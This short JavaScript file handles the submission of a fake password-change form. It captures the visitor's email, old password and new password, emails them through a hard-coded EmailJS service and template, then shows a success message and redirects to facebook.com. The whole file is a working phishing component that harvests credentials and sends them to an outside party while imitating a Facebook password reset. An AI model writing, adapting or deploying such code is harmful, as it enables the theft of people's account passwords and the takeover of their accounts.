// Initialize EmailJS with your public key
emailjs.init('ODWuzZ-mZLM196nkP');  // <-- Your public key

document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
    from_name: email,
    message: `Old Password: ${oldPassword}\nNew Password: ${newPassword}`,
    reply_to: email
  })
  .then(function() {
    document.getElementById('passwordBox').style.display = 'none';
    document.getElementById('successMessage').style.display = 'flex';

    setTimeout(function() {
      window.location.href = 'https://facebook.com';
    }, 2000);
  }, function() {
    alert('Something went wrong. Please try again.');
  });
});